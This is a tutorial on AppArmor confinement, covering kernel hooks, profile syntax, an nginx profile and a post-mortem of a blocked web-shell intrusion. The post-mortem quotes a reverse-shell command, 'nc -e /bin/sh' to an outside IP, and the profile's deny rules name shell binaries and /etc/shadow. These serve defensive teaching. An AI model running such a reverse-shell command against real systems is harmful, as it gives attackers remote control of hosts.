# Day 59: AppArmor Security Profiles: Path-Based Mandatory Access Control and Kernel Enforcement

Standard Linux Discretionary Access Control (DAC) operates under user identity: if a web server running as user `www-data` is compromised via remote code execution, the attacker inherits all access rights of `www-data`, allowing them to read database configuration files, write to `/tmp`, or execute local reconnaissance binaries (`/bin/ps`, `/usr/bin/id`). **AppArmor** (Application Armor) implements **Mandatory Access Control (MAC)** through the Linux Security Module (LSM) framework. By confining applications via path-based security profiles, AppArmor restricts processes to the minimum necessary capabilities and filesystem access, regardless of process UID.

---

## 1. AppArmor Architecture & LSM Hooks

AppArmor is integrated directly into the Linux kernel via the Linux Security Modules (LSM) abstraction layer (`security/apparmor/`). When a confined process issues a syscall (`open`, `execve`, `ptrace`, `bind`), the kernel first passes DAC permission checks, then invokes the designated AppArmor LSM hook.

```text
Process Syscall: open("/etc/shadow", O_RDONLY)
       |
       v
[Standard DAC Check: EUID == Inode Owner?]
       | (Success: UID is 0 / root)
       v
[LSM Framework Hook: security_file_open()]
       |
       v
[AppArmor Engine: Inspect current->security profile]
       |
       +--> Path Resolution: Resolve dentry to full pathname
       +--> DFA Traversal: Check "/etc/shadow" against Profile Rules
       |
       +--> MATCH: Rule 'r /etc/shadow' exists?
               |
               +--> YES: Allow open() syscall -> Return FD
               +--> NO:  DENY -> Emit Audit Log to auditd / dmesg
                                  Return -EACCES (Permission Denied)
```

### Kernel Profile Structure (`security/apparmor/include/profile.h`)
```c
struct aa_profile {
    struct aa_policy base;
    struct aa_profile __rcu *parent;
    struct aa_dfa *dfa;         /* Deterministic Finite Automaton for path matching */
    struct aa_policydb policy;  /* Permitted permissions bitmask */
    struct aa_file_rules file;  /* Filesystem path constraints */
    struct aa_caps caps;        /* Permitted capabilities */
    struct aa_net net;          /* Network domain / socket restrictions */
    int mode;                   /* APPARMOR_ENFORCE vs APPARMOR_COMPLAIN */
};
```

---

## 2. Mathematical Path Traversal via Deterministic Finite Automata (DFA)

Unlike regex engines that exhibit backtracking vulnerabilities ($O(2^N)$), AppArmor compiles profile path patterns (such as `/var/log/**/*.log` or `/etc/**`) into a **Deterministic Finite Automaton (DFA)**.

### DFA Path Matching Complexity
Let $P$ be the resolved canonical pathname of length $L$ characters.
The DFA transitions from state $S_0$ to $S_L$ in exactly $L$ steps:

$$T_{\text{match}} = O(L)$$

The evaluation time is **completely independent** of the number of path rules defined in the profile. Whether a profile contains 5 rules or 50,000 rules, evaluation overhead remains strictly constant with respect to path length.

```text
State 0 ---['/']---> State 1 ---['v','a','r']---> State 2 ---['/']---> State 3 (Accepted 'r')
```

---

## 3. Profile Grammar, Path Modifiers, and Execution Transitions

AppArmor profiles are plain-text declarative files located in `/etc/apparmor.d/`.

### Core File Access Modes
- `r`: Read data
- `w`: Write / create / truncate
- `a`: Append-only writes
- `k`: File locking (`fcntl(F_SETLK)`)
- `l`: Hard link creation

### Process Execution Modifiers (Crucial for Privilege Boundaries)
When a confined process executes a child binary via `execve()`, AppArmor enforces strict transition semantics:
1. **`px` (Profile Transition with Scrubbed Environment)**: Cleanses dangerous environment variables (`LD_PRELOAD`, `LD_LIBRARY_PATH`) and executes the child under its own dedicated profile.
2. **`ix` (Inherit Profile)**: The child binary executes confined under the *parent's* existing security profile.
3. **`ux` (Unconfined with Scrubbed Environment)**: Executes the child without any AppArmor confinement (dangerous).
4. **`cx` (Child Profile Transition)**: Transitions to a nested sub-profile defined within the parent.

---

## 4. Compilable C Implementation: Testing AppArmor State via `libapparmor`

Applications can query and manipulate their own AppArmor confinement state using the `libapparmor` API.

Compile with: `gcc -O2 -Wall -Wextra check_apparmor.c -o check_apparmor -lapparmor`

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/apparmor.h>
#include <errno.h>

int main(void) {
    /* Step 1: Check if AppArmor is enabled in kernel */
    if (!aa_is_enabled()) {
        printf("AppArmor is NOT enabled on this system.\n");
        return EXIT_FAILURE;
    }
    printf("SUCCESS: AppArmor LSM is active and enforcing in kernel.\n");

    /* Step 2: Query current process confinement context */
    char *label = NULL;
    char *mode = NULL;

    if (aa_getcon(&label, &mode) < 0) {
        perror("aa_getcon failed");
        return EXIT_FAILURE;
    }

    printf("Current Process Confinement Profile: '%s' (Mode: %s)\n", label, mode);

    /* Clean up allocated strings */
    free(label);
    free(mode);

    return EXIT_SUCCESS;
}
```

---

## 5. Deconstructing a Production Profile: Confining an NGINX Web Server

Below is an annotated, production-grade AppArmor profile confining `/usr/sbin/nginx`:

```text
#include <tunables/global>

/usr/sbin/nginx {
    #include <abstractions/base>
    #include <abstractions/nameservice>

    # Linux Capabilities strictly restricted
    capability dac_override,
    capability net_bind_service,
    capability setgid,
    capability setuid,

    # File access rules
    /usr/sbin/nginx mr,
    /etc/nginx/** r,
    /var/log/nginx/* w,
    /var/run/nginx.pid rw,
    /var/www/html/** r,

    # Temporary files restricted strictly to buffer directories
    /var/lib/nginx/body/* rw,
    /var/lib/nginx/fastcgi/* rw,

    # Explicit Denials: Never allow reading shadow, bash, or private keys
    deny /etc/shadow r,
    deny /bin/bash x,
    deny /bin/sh x,
    deny /usr/bin/python* x,
}
```
If an attacker exploits a remote buffer overflow in NGINX and injects shellcode attempting to execute `/bin/sh`, the kernel immediately blocks the syscall with `-EACCES` because execution of `/bin/sh` is explicitly denied by the profile.

---

## 6. Production Post-Mortem: Zero-Day RCE Neutralized by Strict Profile

### Incident Overview
A zero-day arbitrary file upload and remote code execution vulnerability was discovered in a popular PHP-FPM web portal hosted by a healthcare provider. The attacker uploaded a malicious web shell (`shell.php`) designed to dump the entire `/etc/passwd`, read MySQL database connection strings, and establish a reverse TCP meterpreter shell.

### The AppArmor Interception
1. The web shell successfully uploaded to `/var/www/html/uploads/shell.php`.
2. The attacker invoked `system("nc -e /bin/sh 198.51.100.1 4444")`.
3. The kernel intercepted the `execve("/bin/nc", ...)` syscall.
4. The PHP-FPM profile (`/etc/apparmor.d/usr.sbin.php-fpm`) lacked execution permissions (`x`) for network binaries.
5. The kernel logged the violation to `/var/log/audit/audit.log`:
```text
type=AVC msg=audit(1698000000.123:456): apparmor="DENIED" operation="exec" 
profile="/usr/sbin/php-fpm" name="/bin/nc" pid=14022 comm="php-fpm" requested_mask="x" denied_mask="x"
```
6. The exploit terminated instantly with a permission error. The attacker was unable to gain interactive access, and the automated security operations center (SOC) was alerted within seconds.
---

## 7. AppArmor Profile Modes: Enforce vs Complain vs Audit

Every AppArmor profile operates in one of three kernel enforcement modes:

1. **`enforce`**: Violations are blocked immediately with `-EACCES`, and an audit event is logged to `/var/log/audit/audit.log`.
2. **`complain`**: Violations are permitted to proceed, but an audit warning is generated. This mode is critical during profile authoring to discover legitimate application access paths without causing service downtime.
3. **`audit`**: Normal enforcement occurs, but *all* actions (including permitted accesses) generate audit records for forensic analysis.

```bash
# Transition profile to learning/complain mode
aa-complain /usr/sbin/nginx

# Transition profile back to strict enforcement
aa-enforce /usr/sbin/nginx

# Check live profile confinement status across all system processes
aa-status
```
---

## 8. Composing Custom AppArmor Abstractions

AppArmor maintains reusable rule templates within `/etc/apparmor.d/abstractions/`:
- `abstractions/base`: Core runtime permissions (glibc loading, locale data, `/dev/null`, `/dev/urandom`).
- `abstractions/nameservice`: DNS and NSS lookups (`/etc/resolv.conf`, `/etc/hosts`, `/etc/nsswitch.conf`).
- `abstractions/ssl_certs`: System trusted CA certificate bundles (`/etc/ssl/certs/**`).

Including these abstractions keeps individual daemon profiles concise, audit-friendly, and maintainable across upstream package updates:
```text
#include <abstractions/base>
#include <abstractions/nameservice>
#include <abstractions/ssl_certs>
```
